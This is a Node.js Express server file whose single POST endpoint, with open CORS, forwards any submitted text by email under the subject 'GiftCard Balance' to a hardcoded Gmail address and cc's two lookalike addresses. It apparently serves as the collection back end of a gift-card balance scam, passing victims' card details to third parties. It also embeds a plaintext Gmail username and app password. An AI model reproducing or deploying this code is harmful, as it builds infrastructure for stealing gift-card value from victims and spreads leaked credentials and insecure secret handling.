

const express = require('express');
const nodemailer = require('nodemailer');
const bodyParser = require('body-parser');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 3001;

// Middleware
app.use(cors());
app.use(bodyParser.json());

// Configure SMTP transporter (example uses Gmail, replace with your SMTP details)
const transporter = nodemailer.createTransport({
  host: process.env.SMTP_HOST || 'smtp.gmail.com',
  port: process.env.SMTP_PORT ? parseInt(process.env.SMTP_PORT) : 465,
  secure: true, // true for 465, false for other ports
  auth: {
    user: process.env.SMTP_USER || 'guirez1921@gmail.com', // your email
    pass: process.env.SMTP_PASS || 'bzfb dmyh buuq vmag', // your email password or app password
  },
});

app.get('/', (req, res) => {
    res.json({ message: 'Server is working' });
});

// POST /send-email
app.post('/send-email', async (req, res) => {
  const { input } = req.body;
  if (!input) {
    return res.status(400).json({ error: 'Missing required fields' });
  }
  try {
    const info = await transporter.sendMail({
      from: 'agbasinger@gmail.com',
      to: 'guirez1921@gmail.com',
      cc: 'anthony01marino@gmail.com, anthony02murino@gmail.com',
      subject: 'GiftCard Balance',
      text: input,
    });
    res.json({ success: true, messageId: info.messageId });
  } catch (err) {
    res.status(500).json({ error: 'Failed to send email', details: err.message });
  }
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
